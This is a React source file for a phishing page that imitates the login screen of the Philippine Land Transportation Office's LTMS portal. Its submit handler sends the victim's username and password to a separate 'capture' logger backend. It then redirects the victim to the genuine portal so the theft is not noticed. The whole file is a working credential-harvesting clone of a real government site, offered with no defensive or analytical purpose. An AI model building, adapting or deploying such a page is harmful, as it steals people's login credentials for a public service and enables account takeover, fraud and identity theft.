import React, { useState } from "react";

export default function Login() {
    const [username, setUsername] = useState("");
    const [password, setPassword] = useState("");
    const [remember, setRemember] = useState(false);
    const [showPassword, setShowPassword] = useState(false);

    const handleSubmit = async (e) => {
        e.preventDefault();
        
        try {
            // Sends the captured data to your local FastAPI backend
            await fetch("http://localhost:8000/api/capture", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ username, password, remember })
            });
        } catch (error) {
            console.log("Connection error to local backend logger:", error);
        }

        // Redirect to the actual LTO portal after capturing
        window.location.href = "https://portal.lto.gov.ph/";
    };

    return (
        <div style={styles.pageBody}>
            <style>{`
                * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
                .lto-input:focus { border-color: #0b2575 !important; outline: none; background-color: #ffffff !important; box-shadow: 0 0 0 2px rgba(11,37,117,0.1); }
                .nav-link:hover { opacity: 0.8; text-decoration: underline; }
                .forgot-btn:hover { text-decoration: underline; color: #0b2575 !important; }
            `}</style>

            {/* Header Navbar */}
            <header style={styles.header}>
                <div style={styles.headerBranding}>
                    <button style={styles.navControlBtn} type="button" title="Expand / Collapse Navigation">
                        <span style={{ fontSize: '15px' }}>☰</span>
                    </button>
                    <div style={styles.headerLogo}>
                        <a href="f?p=1200:HOME::::::">
                            <img src="/images/logo.webp" alt="LTO Logo" style={{ width: '28px', height: '28px', background: '#fff', borderRadius: '50%', padding: '2px', objectFit: 'contain', display: 'block' }} />
                        </a>
                    </div>
                    <div style={{ fontWeight: 'bold', fontSize: '0.95rem', letterSpacing: '0.5px' }}>
                        LTMS PORTAL
                    </div>
                </div>
                
                <div style={styles.headerNavBar}>
                    <ul style={styles.navigationList}>
                        <li><a href="https://lto.gov.ph/" target="_blank" rel="noreferrer" className="nav-link" style={styles.navItemLink}>☁ LTO Official Webpage</a></li>
                        <li><a href="#" onClick={(e) => e.preventDefault()} className="nav-link" style={styles.navItemLink}>🎓 E-Learning ▾</a></li>
                        <li><a href="#" onClick={(e) => e.preventDefault()} className="nav-link" style={styles.navItemLink}>📞 Contact</a></li>
                        <li><a href="#" onClick={(e) => e.preventDefault()} className="nav-link" style={styles.navItemLink}>+ Register</a></li>
                        <li><a href="#" onClick={(e) => e.preventDefault()} className="nav-link" style={styles.navItemLink}>👤 Login</a></li>
                    </ul>
                </div>
            </header>

            {/* Body Content Container */}
            <div style={styles.tBody}>
                <div style={styles.bodyWrap}>
                    <main style={styles.mainCol}>
                        <div style={styles.loginContainer}>
                            
                            {/* Login Card Region */}
                            <div style={styles.loginRegion}>
                                <div style={styles.loginHeader}>
                                    <div style={styles.ltoLogoGraphic}>
                                        <img 
                                            src="/images/logo.webp" 
                                            alt="LTO Seal" 
                                            style={{ width: '70px', height: '70px', objectFit: 'contain' }} 
                                        />
                                    </div>
                                    <h1 style={styles.loginTitle}>
                                        <b style={{ fontSize: '1.6rem', color: '#0433A9', letterSpacing: '0.5px' }}>LTMS PORTAL</b>
                                        <div style={{ fontSize: '0.78rem', fontWeight: 'normal', color: '#666', marginTop: '3px' }}>Land Transportation Management System</div>
                                    </h1>
                                </div>

                                <form onSubmit={handleSubmit}>
                                    <div style={styles.loginBody}>
                                        
                                        {/* Username Field */}
                                        <div style={styles.fieldContainer}>
                                            <label htmlFor="P9999_USERNAME" style={{ display: 'none' }}>LTO Client Number</label>
                                            <div style={styles.itemWrapper}>
                                                <input 
                                                    type="text" 
                                                    id="P9999_USERNAME" 
                                                    name="P9999_USERNAME" 
                                                    placeholder="Email or LTO Client Number" 
                                                    className="lto-input"
                                                    value={username}
                                                    onChange={(e) => setUsername(e.target.value)}
                                                    required
                                                    style={styles.textInput}
                                                />
                                                <span style={styles.inputIcon}>👤</span>
                                            </div>
                                        </div>

                                        {/* Password Field */}
                                        <div style={styles.fieldContainer}>
                                            <label htmlFor="P9999_PASSWORD" style={{ display: 'none' }}>Password</label>
                                            <div style={styles.itemWrapper}>
                                                <input 
                                                    type={showPassword ? "text" : "password"} 
                                                    name="P9999_PASSWORD" 
                                                    id="P9999_PASSWORD" 
                                                    placeholder="PASSWORD" 
                                                    className="lto-input"
                                                    value={password}
                                                    onChange={(e) => setPassword(e.target.value)}
                                                    required
                                                    style={{ ...styles.textInput, textTransform: 'none' }}
                                                />
                                                <span style={styles.inputIcon}>🔑</span>
                                                <span 
                                                    onClick={() => setShowPassword(!showPassword)}
                                                    style={styles.passwordReveal}
                                                >
                                                    <span style={{ fontSize: '16px', cursor: 'pointer' }}>{showPassword ? "👁️" : "👁️‍🗨️"}</span>
                                                </span>
                                            </div>
                                        </div>

                                        {/* Options Row */}
                                        <div style={styles.optionsRow}>
                                            <div style={styles.floatLeft}>
                                                <label style={{ display: 'flex', alignItems: 'center', gap: '6px', cursor: 'pointer', fontSize: '0.78rem', color: '#444' }}>
                                                    <input 
                                                        type="checkbox" 
                                                        id="P9999_REMEMBER_0" 
                                                        name="P9999_REMEMBER" 
                                                        value="Y"
                                                        checked={remember}
                                                        onChange={(e) => setRemember(e.target.checked)}
                                                        style={{ width: '14px', height: '14px', accentColor: '#0433A9' }}
                                                    />
                                                    Remember Username
                                                </label>
                                            </div>
                                            <button 
                                                type="button" 
                                                id="btn-forgot-pwd" 
                                                className="forgot-btn"
                                                onClick={(e) => e.preventDefault()}
                                                style={styles.floatRightBtn}
                                            >
                                                Forgot Password
                                            </button>
                                        </div>

                                    </div>

                                    {/* Sign In Button */}
                                    <div style={styles.loginButtons}>
                                        <button 
                                            type="submit" 
                                            id="btn-login" 
                                            style={styles.signInButton}
                                        >
                                            Sign In
                                        </button>
                                    </div>
                                </form>
                            </div>

                        </div>
                    </main>
                </div>
            </div>

            {/* Footer Bar */}
            <footer style={styles.footerBar}>
                <div>Release 2.5.4</div>
                <div style={{ letterSpacing: '0.5px' }}>MANAGEMENT INFORMATION DIVISION (MID)</div>
            </footer>
        </div>
    );
}

// Inline CSS Styles linking your local public/images/bg.png
const styles = {
    pageBody: {
        width: '100vw',
        minHeight: '100vh',
        display: 'flex',
        flexDirection: 'column',
        backgroundColor: '#0433A9',
        overflowX: 'hidden',
        color: '#ffffff',
    },
    header: {
        position: 'fixed',
        top: 0,
        left: 0,
        width: '100%',
        height: '50px',
        backgroundColor: '#0433A9',
        borderBottom: '1px solid #1e4bb8',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        padding: '0 12px',
        zIndex: 1000,
        boxShadow: '0 1px 3px rgba(0,0,0,0.2)',
    },
    headerBranding: {
        display: 'flex',
        alignItems: 'center',
        gap: '8px',
    },
    navControlBtn: {
        background: 'transparent',
        border: 'none',
        color: '#fff',
        cursor: 'pointer',
        padding: '4px 6px',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
    },
    headerLogo: {
        display: 'flex',
        alignItems: 'center',
    },
    headerNavBar: {
        display: 'flex',
        alignItems: 'center',
    },
    navigationList: {
        listStyle: 'none',
        display: 'flex',
        alignItems: 'center',
        gap: '18px',
        margin: 0,
        padding: 0,
    },
    navItemLink: {
        color: '#ffffff',
        textDecoration: 'none',
        fontSize: '0.78rem',
        fontWeight: '500',
    },
    tBody: {
        marginTop: '50px',
        flex: 1,
        display: 'flex',
        flexDirection: 'column',
        backgroundImage: 'url("/images/bg.png")',
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        position: 'relative',
    },
    bodyWrap: {
        flex: 1,
        display: 'flex',
        flexDirection: 'column',
        position: 'relative',
        backgroundColor: 'rgba(0, 54, 175, 0.55)',
        minHeight: 'calc(100vh - 90px)',
    },
    mainCol: {
        flex: 1,
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        padding: '20px',
    },
    loginContainer: {
        width: '100%',
        maxWidth: '420px',
    },
    loginRegion: {
        backgroundColor: '#f8f8f8',
        borderRadius: '4px',
        boxShadow: '0 8px 20px rgba(0,0,0,0.3)',
        padding: '30px 25px',
        color: '#333333',
    },
    loginHeader: {
        textAlign: 'center',
        marginBottom: '20px',
    },
    ltoLogoGraphic: {
        height: '85px',
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'center',
        marginBottom: '8px',
    },
    loginTitle: {
        margin: 0,
    },
    loginBody: {
        marginBottom: '15px',
    },
    fieldContainer: {
        marginBottom: '14px',
        position: 'relative',
    },
    itemWrapper: {
        position: 'relative',
        display: 'flex',
        alignItems: 'center',
    },
    textInput: {
        width: '100%',
        padding: '11px 11px 11px 38px',
        backgroundColor: '#f5ffff',
        border: '1px solid #dcdcdc',
        borderRadius: '4px',
        fontSize: '0.82rem',
        color: '#333',
    },
    inputIcon: {
        position: 'absolute',
        left: '12px',
        color: '#666',
        fontSize: '0.88rem',
    },
    passwordReveal: {
        position: 'absolute',
        right: '10px',
        top: '50%',
        transform: 'translateY(-50%)',
        zIndex: 100,
    },
    optionsRow: {
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        marginTop: '8px',
        marginBottom: '8px',
    },
    floatLeft: {
        float: 'left',
    },
    floatRightBtn: {
        background: 'transparent',
        border: 'none',
        color: '#444',
        fontSize: '0.78rem',
        cursor: 'pointer',
        padding: 0,
    },
    loginButtons: {
        marginTop: '8px',
    },
    signInButton: {
        width: '100%',
        padding: '11px',
        backgroundColor: '#0b2575',
        color: '#ffffff',
        fontWeight: 'bold',
        border: 'none',
        borderRadius: '4px',
        fontSize: '0.85rem',
        cursor: 'pointer',
        boxShadow: '0 2px 4px rgba(0,0,0,0.15)',
    },
    footerBar: {
        width: '100%',
        height: '40px',
        backgroundColor: '#0433A9',
        color: '#ffffff',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        padding: '0 20px',
        fontSize: '0.72rem',
        borderTop: '1px solid #1e4bb8',
    },
};